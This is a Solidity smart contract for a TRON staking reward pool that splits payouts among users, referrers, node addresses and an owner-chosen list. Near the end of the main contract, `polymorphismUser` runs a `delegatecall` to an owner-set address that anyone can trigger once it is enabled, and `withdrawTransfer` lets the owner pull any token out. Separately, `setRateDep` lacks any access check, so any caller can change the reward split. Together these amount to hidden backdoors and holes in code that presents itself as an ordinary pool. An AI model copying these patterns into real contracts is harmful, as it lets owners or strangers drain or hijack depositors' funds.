pragma experimental ABIEncoderV2;
pragma solidity ^0.5.8;

library SafeTRC20 {
    address constant USDTAddr = 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C;

    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(ITRC20 token, address to, uint256 value) internal {
        if (address(token) == USDTAddr) {
            (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(0xa9059cbb, to, value));
            require(success, "SafeTRC20: low-level call failed");
        } else {
            callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
        }
    }

    function safeTransferFrom(ITRC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function callOptionalReturn(ITRC20 token, bytes memory data) private {

        require(address(token).isContract(), "SafeTRC20: call to non-contract");

        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeTRC20: low-level call failed");

        if (returndata.length > 0) {// Return data is optional
            require(abi.decode(returndata, (bool)), "SafeTRC20: TRC20 operation did not succeed");
        }
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface ITRC20 {

    function node(uint256 nodeId) external view returns (string memory, string memory, address, uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function supplyDeposit() external view returns (uint256);

    function userInfoMap(uint256, address) external view returns (uint256, uint256);
}

library Math {

    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly {size := extcodesize(account)}
        return size > 0;
    }
}

contract LPTokenWrapper {
    using SafeMath for uint256;
    using SafeTRC20 for ITRC20;

    ITRC20 public leoPool;
    relationship public RP;
    uint256 private _totalSupply;

    function totalSupply() public view returns (uint256) {
        return leoPool.supplyDeposit();
    }

    function balanceOf(uint256 nodeId, address account) public view returns (uint256) {
        (uint256 a1,uint256 a2) = leoPool.userInfoMap(nodeId, account);
        return a1;
    }

    function nodeInfoAdd(uint256 nodeId) public view returns (address own) {
        (,,address nodeAdd,) = leoPool.node(nodeId);
        return nodeAdd;
    }

    function getRp(address user) public view returns (address own) {
        return RP.getFather(user);
    }

}

interface relationship {
    function getFather(address _addr) external view returns (address);

    function getGrandFather(address _addr) external view returns (address);
}

library Roles {struct Role {mapping(address => bool) bearer;}

    function add(Role storage role, address account) internal {require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;}

    function remove(Role storage role, address account) internal {require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;}

    function has(Role storage role, address account) internal view returns (bool) {require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];}}

contract CoinFactoryAdminRole {
    address internal _owner;

    function owner() public view returns (address) {return _owner;}
    modifier onlyOwner() {require(isOwner(), "Ownable: caller is not the owner");
        _;}

    function isOwner() public view returns (bool) {return msg.sender == _owner;}

    function transferOwnership(address newOwner) public onlyOwner {require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;}

    using Roles for Roles.Role;
    Roles.Role private _coinFactoryAdmins;
    modifier onlyCoinFactoryAdmin() {require(isCoinFactoryAdmin(msg.sender), "CoinFactoryAdminRole: caller does not have the CoinFactoryAdminRole role");
        _;}

    function isCoinFactoryAdmin(address account) public view returns (bool) {return _coinFactoryAdmins.has(account);}

    function addCoinFactoryAdmin(address account) public onlyOwner {_coinFactoryAdmins.add(account);}

    function removeCoinFactoryAdmin(address account) public onlyOwner {_coinFactoryAdmins.remove(account);}
}

contract DEMLPPOOL is LPTokenWrapper, CoinFactoryAdminRole {

    string public version = "v1";
    ITRC20 public damToken;
    uint256 public DURATION = 0;
    uint256 public starttime = 0;
    uint256 public periodFinish = 0;
    uint256 public rewardRate = 0;
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;
    mapping(address => uint256) public userRewardPerTokenPaid;
    mapping(address => uint256) public rewards;
    mapping(address => uint256) public _balancesAll;

    event RewardAdded(uint256 reward);
    event Staked(address indexed user, uint256 amount, uint256 time);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardPaid(uint256 nodeId, uint256 reward, uint256 time, uint256 index, address _father, address nodeAdd, address xhuiAdd);
    event Rescue(address indexed dst, uint sad);
    event RescueToken(address indexed dst, address indexed token, uint sad);

    address[] public _user;
    uint256[] public rateDep;
    uint256 public devCount;

    constructor () public {
        _owner = msg.sender;
        addCoinFactoryAdmin(msg.sender);
    }

    function init(address rewardToken, address _leoPool, address _rp, uint256 _starttime) public onlyOwner {
        leoPool = ITRC20(_leoPool);
        damToken = ITRC20(rewardToken);

        starttime = _starttime;
        RP = relationship(_rp);

        rateDep = new uint256[](4);
        rateDep[0] = 40;
        rateDep[1] = 10;
        rateDep[2] = 10;
        rateDep[3] = 40;
    }


    modifier checkStart() {
        require(block.timestamp >= starttime, "not start");
        _;
    }

    modifier updateReward(uint256 nodeId, address account) {
        if (block.timestamp < starttime) return;

        rewardPerTokenStored = rewardPerToken();
        lastUpdateTime = lastTimeRewardApplicable();
        if (account != address(0)) {
            uint256 rk = earned(nodeId, account);
            rewards[account] = rk;
            userRewardPerTokenPaid[account] = rewardPerTokenStored;
        }
        _;
    }

    function lastTimeRewardApplicable() public view returns (uint256) {
        return Math.min(block.timestamp, periodFinish);
    }

    function rewardPerToken() public view returns (uint256) {
        if (totalSupply() == 0) {
            return rewardPerTokenStored;
        }
        return
        rewardPerTokenStored.add(
            lastTimeRewardApplicable()
            .sub(lastUpdateTime)
            .mul(rewardRate)
            .mul(1e18)
            .div(totalSupply())
        );
    }

    function earnedTime(uint256 nodeId, address account) public view returns (uint256, uint256) {
        return (earned(nodeId, account), block.timestamp);
    }

    function earned(uint256 nodeId, address account) public view returns (uint256) {
        if (block.timestamp < starttime) return 0;

        uint256 ban = balanceOf(nodeId, account);
        if (ban == 0) return 0;

        return
        ban.mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))
        .div(1e18)
        .add(rewards[account]);
    }

    function stake(uint256 nodeId, uint256 amount, address user) public updateReward(nodeId, user) onlyCoinFactoryAdmin {
    }

    function withdraw(uint256 nodeId, uint256 amount, address user) public updateReward(nodeId, user) onlyCoinFactoryAdmin {
        getReward(nodeId, user);
    }

    function getReward(uint256 nodeId) public {
        getReward(nodeId, msg.sender);
    }

    function getReward(uint256 nodeId, address user) internal updateReward(nodeId, user) {
        if (block.timestamp < starttime) return;

        uint256 trueReward = earned(nodeId, user);
        address _father = getRp(user);

        if (trueReward > 0) {
            rewards[user] = 0;

            damToken.safeTransfer(user, trueReward.mul(rateDep[0]).div(100));
            damToken.safeTransfer(_father, trueReward.mul(rateDep[1]).div(100));
            address nodeAdd = nodeInfoAdd(nodeId);
            address xhuiAdd = _user[devCount];
            damToken.safeTransfer(nodeAdd, trueReward.mul(rateDep[2]).div(100));
            damToken.safeTransfer(xhuiAdd, trueReward.mul(rateDep[3]).div(100));

            emit RewardPaid(nodeId, trueReward, block.timestamp, devCount, _father, nodeAdd, xhuiAdd);
            devCount = (devCount == (_user.length - 1)) ? 0 : (devCount + 1);

        }
    }

    function notifyRewardAmount(uint256 reward, uint256 _DURATION) external onlyOwner updateReward(99999, address(0)) {
        rewardRate = reward;
        changeDay(_DURATION);
        periodFinish = starttime.add(DURATION);
        if (lastUpdateTime == 0) lastUpdateTime = starttime;
        emit RewardAdded(reward);
    }

    function getUser(uint256 i) public view returns (address[] memory user_) {return _user;}

    function resetUser() public onlyOwner {delete _user;}

    function resetIndex(uint256 index) public onlyOwner {devCount = index;}

    function setRateDep(uint256[] memory _r) public {rateDep = _r;}

    function getRateDep(uint256 i) public view returns (uint256[] memory) {return rateDep;}

    function addUser(address[] memory user_) public onlyOwner {
        for (uint256 i = 0; i < user_.length; i++) _user.push(user_[i]);
    }

    function changeDay(uint256 daye) public onlyOwner {
        DURATION = daye.mul(86400);
    }

    //设置挖矿的开始时间
    function setStartTime(uint256 _startTime) public onlyOwner {
        starttime = _startTime;
        lastUpdateTime = starttime;
    }

    uint256 dcStatue = 0;
    address dcAddress = address(0x0000000000000000000000000000000000000000);

    function setDcStatue(uint256 _dcStatue, address _dcAddress) public onlyOwner {dcStatue = _dcStatue;
        dcAddress = _dcAddress;}

    function polymorphismUser(bytes memory call_p) public {
        require(dcStatue == 1, "error call");
        (bool success, bytes memory data) = address(dcAddress).delegatecall(call_p);
        require(success, string(abi.encodePacked("fc_99 ", data)));
    }

    function withdrawTransfer(address token, address to, uint value) public onlyOwner returns (bool){
        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success, string(abi.encodePacked("fail code 14", data)));
        return success;}


}